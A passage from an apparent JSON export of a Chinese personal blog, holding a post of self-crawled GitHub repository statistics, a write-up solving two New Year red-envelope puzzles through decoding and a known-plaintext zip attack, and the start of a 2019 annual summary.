年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" 